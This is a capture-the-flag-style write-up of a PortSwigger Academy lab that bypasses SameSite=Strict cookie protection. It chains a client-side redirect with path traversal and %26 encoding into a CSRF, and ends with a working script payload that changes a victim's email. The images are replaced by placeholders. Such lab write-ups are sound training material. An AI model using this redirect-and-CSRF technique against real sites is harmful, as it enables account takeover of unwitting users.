# Getting Around SameSite=Strict Using a Client-Side Redirect

The change-email function is vulnerable to CSRF. The goal is to craft a CSRF attack, hosted on the exploit server, that changes the victim's email.

Login credentials for your own account: wiener:peter

Hint: Registering an email already used by someone else isn't allowed. If you test with your own account, be sure to use a different address when building the exploit you'll actually send to the victim.

---

**Reference:**
- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions

pic 1

---

There's a POST request that updates the email address:

pic 2

It's also possible to switch the method to GET and have it still succeed:

pic 3

After posting a blog comment, the page redirects to `/post`:

pic 4
pic 5

Digging into the source, the redirect logic lives in a script at `/resources/js/commentConfirmationRedirect.js`:

```
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

pic 6

This redirect is driven by requests to `/post/comment/confirmation?postId=a`. By manipulating the `postId` parameter, we can try to redirect somewhere like:

```
/post/../my-account/change-email?email=test5%40test.com&submit=1
```

So the attempt becomes:

```
/post/comment/confirmation?postId=../my-account/change-email?email=test7%40test.com&submit=1
```

This redirects properly, but the `submit` parameter doesn't actually get passed along:

pic 7

Replacing `&` with its URL-encoded form `%26` fixes that:

```
/post/comment/confirmation?postId=../my-account/change-email?email=test7%40test.com%26submit=1
```

This version works as expected:

pic 8

Final payload:

```
<script>
    document.location = 'https://0a2900a103d6f68b83782d1900340012.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test777%40test.com%26submit=1';
</script>
```
